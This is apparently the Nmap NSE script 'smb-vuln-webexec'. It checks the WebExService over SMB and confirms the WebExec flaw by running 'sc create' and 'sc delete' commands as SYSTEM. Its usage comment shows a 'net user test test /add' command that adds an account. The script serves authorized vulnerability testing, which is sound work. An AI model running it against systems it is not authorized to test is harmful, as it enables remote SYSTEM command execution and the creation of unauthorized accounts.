local msrpc = require "msrpc"
local smb = require "smb"
local stdnse = require "stdnse"
local shortport = require "shortport"

description = [[
Checks whether the WebExService is installed and startable. Unless it's patched,
the WebExService can run a SYSTEM-level command remotely with any user account.

Note: Requires an account.

References:
* https://www.webexec.org
]]

---
-- @usage
-- nmap --script smb-vuln-webexec --script-args smbusername=<username>,smbpass=<password> -p445 <host>
-- nmap --script smb-vuln-webexec --script-args 'smbusername=<username>,smbpass=<password>,webexec_command=net user test test /add' -p445 <host>
--
-- @output
-- | smb-vuln-webexec:
-- |_  Vulnerable: WebExService could be accessed remotely as the given user!
--
-- | smb-vuln-webexec:
-- |   Vulnerable: WebExService could be accessed remotely as the given user!
-- |_  ...and successfully started console command: net user test test /add

author = "Ron Bowes"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","vuln"}

portrule = shortport.port_or_service({445, 139}, "microsoft-ds", "tcp", "open")

action = function(host, port)

  local open_result
  local close_result
  local bind_result
  local result

  local status, smbstate = msrpc.start_smb(host, msrpc.SVCCTL_PATH)
  if(status == false) then
    return nil, stdnse.format_output(false, smbstate)
  end

  status, bind_result = msrpc.bind(smbstate, msrpc.SVCCTL_UUID, msrpc.SVCCTL_VERSION, nil)

  if(status == false) then
    smb.stop(smbstate)
    return nil, stdnse.format_output(false, bind_result)
  end

  local result, username, domain = smb.get_account(host)
  if(result ~= false) then
    if domain and domain ~= "" then
      username = domain .. "\\" .. stdnse.string_or_blank(username, '<blank>')
    end
  end

  -- Open the service manager
  stdnse.debug("Trying to open the remote service manager with minimal permissions")
  status, open_result = msrpc.svcctl_openscmanagerw(smbstate, host.ip, 0x00000001)

  if(status == false) then
    smb.stop(smbstate)
    return nil, stdnse.format_output(false, open_result)
  end

  open_status, open_service_result = msrpc.svcctl_openservicew(smbstate, open_result['handle'], 'webexservice', 0x00010)
  if open_status == false then
    status, close_result = msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
    smb.stop(smbstate)
    if string.match(open_service_result, 'NT_STATUS_SERVICE_DOES_NOT_EXIST') then
      return nil, stdnse.format_output(false, "Not vulnerable: WebExService is not installed")
    elseif string.match(open_service_result, 'NT_STATUS_WERR_ACCESS_DENIED') then
      return nil, stdnse.format_output(false, "Not vulnerable: WebExService could not be accessed by " .. username)
    end
    return nil, stdnse.format_output(false, "Not vulnerable: WebExService failed to open with an unknown status: " .. open_service_result)
  end

  -- Create a test service that we can query
  local webexec_command = "sc create testservice binpath= c:\\fakepath.exe"
  stdnse.debug("Creating a test service: " .. webexec_command)
  status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], stdnse.strsplit(" ", "install software-update 1 " .. webexec_command))
  if not status then
    return nil, stdnse.format_output(false, "Not vulnerable: coult not start WebExecService: " .. result)
  end

  -- We need some time for the service to run then stop again before we continue
  stdnse.sleep(1)

  -- Try and get a handle to the service with zero permissions
  stdnse.debug("Checking if the test service exists")
  local test_status, test_result = msrpc.svcctl_openservicew(smbstate, open_result['handle'], 'testservice', 0x00000)

  -- If the service DOES_NOT_EXIST, we couldn't run code
  if string.match(test_result, 'DOES_NOT_EXIST') then
    stdnse.debug("Result: Test service does not exist: probably not vulnerable")
    msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
    return nil, stdnse.format_output(false, "Not vulnerable: Could open WebExService, but could not execute code")
  end

  -- Close the handle if we got one
  if test_status then
    stdnse.debug("Result: Got a handle to the test service, it's vulnerable!")
    msrpc.svcctl_closeservicehandle(smbstate, test_result['handle'])
  else
    stdnse.debug("Result: The test service exists, even though we couldn't open it (" .. test_result .. ") - it's vulnerable!")
  end

  -- Delete the service and clean up (ignore the return values because there's nothing more that we can really do)
  webexec_command = "sc delete testservice"
  stdnse.debug("Cleaning up the test service: " .. webexec_command)
  status, result = msrpc.svcctl_startservicew(smbstate, open_service_result['handle'], stdnse.strsplit(" ", "install software-update 1 " .. webexec_command))
  msrpc.svcctl_closeservicehandle(smbstate, open_result['handle'])
  smb.stop(smbstate)
  return true, stdnse.format_output(true, "Vulnerable")
end
